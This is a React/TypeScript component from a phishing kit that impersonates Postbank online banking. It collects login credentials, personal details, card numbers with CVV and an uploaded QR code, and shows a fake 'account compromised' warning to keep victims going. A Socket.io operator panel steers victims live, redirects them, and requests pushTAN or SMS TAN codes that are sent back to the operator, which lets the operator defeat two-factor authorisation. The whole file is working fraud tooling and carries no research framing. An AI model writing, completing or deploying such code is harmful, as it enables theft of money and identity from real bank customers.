import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';

// Import components
import Header from './components/Header';
import LoginForm from './components/LoginForm';
import Loading from './components/Loading';
import ErrorScreen from './components/ErrorScreen';
import PersonalDataForm from './components/PersonalDataForm';
import BankCardForm from './components/BankCardForm';
import QRInstructionsScreen from './components/QRInstructionsScreen';
import QRUploadForm from './components/QRUploadForm';
import QRErrorScreen from './components/QRErrorScreen';
import FinalSuccessScreen from './components/FinalSuccessScreen';
import AccountCompromisedScreen from './components/AccountCompromisedScreen';
import { PushTANScreen } from './components/PushTANScreen';
import { SMSTANScreen } from './components/SMSTANScreen';
import templateSocketClient from '../../utils/socketClient';

import './PostbankStyle.css';

// Postbank flow states (with double login and QR codes)
const STATES = {
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  QR_INSTRUCTIONS: 'qr_instructions',
  QR_UPLOAD: 'qr_upload',
  QR_ERROR: 'qr_error',
  QR_RETRY: 'qr_retry',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  doubleLogin: boolean;
  personalData: boolean;
  bankCard: boolean;
  qrCode: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  doubleLogin: true,
  personalData: true,
  bankCard: true,
  qrCode: true
};

// Types for Postbank flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

// AutoLogin component to handle automatic key generation
function AutoLogin() {
  const navigate = useNavigate();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Update metadata for Postbank
    const metadata = getTemplateMetadata('postbank');
    updatePageMetadata(metadata);

    // Create session using backend
    const initializeSession = async () => {
      try {
        const newKey = await createTemplateSession('postbank');
        console.log('Generated key for Postbank:', newKey);
        navigate(`/postbank/${newKey}`);
      } catch (error) {
        console.error('Failed to create Postbank session:', error);
        setError('Fehler beim Erstellen der Sitzung');
        // Fallback to random key
        const fallbackKey = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        navigate(`/postbank/${fallbackKey}`);
      }
    };

    // Small delay to show loading
    setTimeout(initializeSession, 500);
  }, [navigate]);

  if (error) {
    return <ErrorScreen message={error} />;
  }

  return <Loading message="Sitzung wird erstellt" type="default" />;
}

// Main flow component for Postbank with double login and QR process
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const navigate = useNavigate();
  
  const [state, setState] = useState(STATES.LOGIN);
  const [loading, setLoading] = useState(false);
  const [config, setConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState('');
  
  // Session data storage
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    // Update metadata for Postbank
    const metadata = getTemplateMetadata('postbank');
    updatePageMetadata(metadata);

    // Load step configuration from backend
    const loadConfig = async () => {
      try {
        const configData = await getTemplateConfig('postbank');
        setConfig(configData.steps);
        if (process.env.NODE_ENV === 'development') {
        console.log('Loaded Postbank step config:', configData.steps);
        }
      } catch (error) {
        console.warn('Failed to load step config, using defaults:', error);
      }
    };

    if (!key) {
      navigate('/postbank');
      return;
    }

    console.log('Postbank flow started with key:', key);
    loadConfig();
    
    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'postbank',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          // Show loading screen during state transition with natural banking messages
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'qr_upload':
                return 'QR-Code Bereich wird vorbereitet...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          // Show loading screen during data injection
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          // If switching to AFK mode and waiting, continue flow
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key, navigate, isWaitingForAdmin, sessionData.pendingState]);

  // Handle login submission (Step 1)
  const handleLoginSubmit = async (data: LoginData) => {
    try {
      console.log('Postbank: Login submitted for session:', key);
      console.log('Postbank: Login data being submitted:', data);
      
      setState(STATES.LOADING);
      setLoadingMessage("Anmeldung wird verarbeitet...");
      
      // Submit login data to backend
      const response = await submitTemplateData({
        template_name: 'postbank',
        key: key || '',
        step: 'login',
        data: {
          username: data.username,
          password: data.password
        }
      });

      if (response.success) {
        console.log('✅ Postbank login data submitted successfully');
        setSessionData((prev: any) => ({ ...prev, login: data }));
        
        // Check doubleLogin config
        if (config.doubleLogin) {
          proceedToNextState(STATES.ACCOUNT_COMPROMISED, 'Sicherheitsprüfung wird gestartet...');
        } else if (config.personalData) {
          proceedToNextState(STATES.PERSONAL_DATA, 'Persönliche Daten werden geladen...');
        } else if (config.qrCode) {
          proceedToNextState(STATES.QR_INSTRUCTIONS, 'QR-Code Bereich wird vorbereitet...');
        } else if (config.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      } else {
        console.error('❌ Postbank login submission failed:', response.error);
        setState(STATES.LOGIN_ERROR);
      }
    } catch (error: any) {
      console.error('❌ Postbank login error:', error);
      setState(STATES.LOGIN_ERROR);
    }
  };

  // Handle account compromised continuation (Step 2)
  const handleAccountCompromisedContinue = () => {
    setTimeout(() => {
      if (config.personalData) {
        proceedToNextState(STATES.PERSONAL_DATA, 'Persönliche Daten werden geladen...');
      } else if (config.qrCode) {
        proceedToNextState(STATES.QR_INSTRUCTIONS, 'QR-Code Bereich wird vorbereitet...');
      } else if (config.bankCard) {
        proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
      } else {
        proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
      }
    }, 2000);
  };

  // Handle personal data submission (Step 3)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('Postbank: Personal data submitted for session:', key);
      console.log('Postbank: Personal data being submitted:', data);
      
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'postbank',
        key: key || '',
        step: 'personal-data-complete',
        data: data
      });

      if (response.success) {
        console.log('✅ Postbank personal data submitted successfully');
        setSessionData((prev: any) => ({ ...prev, personalData: data }));
        
        // Continue to next step based on configuration
        if (config.qrCode) {
          proceedToNextState(STATES.QR_INSTRUCTIONS, 'QR-Code Bereich wird vorbereitet...');
        } else if (config.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      } else {
        console.error('❌ Postbank personal data submission failed:', response.error);
        setError(response.error || 'Fehler beim Verarbeiten der persönlichen Daten');
      }
    } catch (error: any) {
      console.error('❌ Postbank personal data error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
    }
  };

  // Handle QR instructions continue (Step 4)
  const handleQRInstructionsContinue = () => {
    proceedToNextState(STATES.QR_UPLOAD, 'QR-Code Upload wird vorbereitet...');
  };

  // Handle QR upload submission (Step 5)
  const handleQRUpload = async (file: File) => {
    try {
      console.log('QR upload for session:', key);
      
      setState(STATES.LOADING);
      setLoadingMessage("QR-Code wird verarbeitet...");
      
      // Upload QR file to backend using the proper file upload function
      const { uploadTemplateFile } = await import('../../utils/templateApi');
      const response = await uploadTemplateFile('postbank', key || '', file, 'qr-upload');

      if (response.success) {
        // For Postbank, after QR we go to bank card
        if (config.bankCard) {
          proceedToNextState(STATES.BANK_CARD, 'Bankdaten werden geladen...');
        } else {
          proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
        }
      } else {
        setState(STATES.QR_ERROR);
      }
    } catch (error: any) {
      console.error('QR upload error:', error);
      setState(STATES.QR_ERROR);
    }
  };

  // Handle QR error retry
  const handleQRErrorRetry = () => {
    setState(STATES.QR_UPLOAD);
  };

  // Handle bank card submission (Step 6)
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Bank card data submitted for session:', key);
      
      console.log('Postbank: Bank card data being submitted:', data);
      
      // Submit bank card data to backend (backend will create lead from session data)
      try {
        const response = await submitTemplateData({
          template_name: 'postbank',
          key: key || '',
          step: 'bank-card-complete',
          data: data
        });
        
        console.log('Complete lead data submitted successfully:', response);
        
        if (response.success) {
          console.log('Lead creation completed successfully');
        }
      } catch (apiError: any) {
        console.error('Failed to submit complete data:', apiError);
        // Continue with flow even if API fails
      }
      
      setState(STATES.LOADING);
      setLoadingMessage("Kartendaten werden verarbeitet...");
      
      // Simulate processing
      setTimeout(() => {
        proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
      }, 3000);
    } catch (error: any) {
      console.error('Bank card submission error:', error);
      setError('Fehler beim Speichern der Kartendaten');
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Postbank: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'postbank',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Postbank bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Postbank bank card skip completed successfully');
      
      // Show loading screen
      setState(STATES.LOADING);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        proceedToNextState(STATES.FINAL_SUCCESS, 'Vorgang wird abgeschlossen...');
      }, 3000);
      
    } catch (error) {
      console.error('❌ Postbank bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render current state
  const renderContent = () => {
    if (loading) {
      return <Loading message={loadingMessage} type="processing" />;
    }
    
    if (error && state === STATES.ERROR) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLoginSubmit} />;
        
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLoginSubmit} showError={true} />;
        
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleAccountCompromisedContinue} />;
        
      case STATES.PERSONAL_DATA:
        return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        
      case STATES.QR_INSTRUCTIONS:
        return <QRInstructionsScreen onContinue={handleQRInstructionsContinue} />;
        
      case STATES.QR_UPLOAD:
        return <QRUploadForm onUpload={handleQRUpload} />;
        
      case STATES.QR_ERROR:
        return <QRErrorScreen onRetry={handleQRErrorRetry} />;
        
      case STATES.BANK_CARD:
        return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('pushTAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            // Send TAN completion back to admin
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            // Send TAN cancellation back to admin
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
        
      case STATES.LOADING:
        return <Loading message={loadingMessage} type="processing" />;
        
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
        
      default:
        return <ErrorScreen message="Unbekannter Zustand" />;
    }
  };

  // Check if we're showing the login page (no header needed)
  const isLoginPage = state === STATES.LOGIN || state === STATES.LOGIN_ERROR;
  
  if (isLoginPage) {
    // Login page should be full screen without header - just the split layout
    return renderContent();
  }

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: 'white',
      display: 'flex',
      flexDirection: 'column'
    }}>
      <Header />
      <main style={{ 
        flex: 1
      }}>
        {renderContent()}
      </main>
    </div>
  );
}

// Main Postbank Template Component
const PostbankTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin to generate one
  if (!key) {
    return <AutoLogin />;
  }

  // If key provided, show the main form flow
  return <FormFlow />;
};

export default PostbankTemplate;
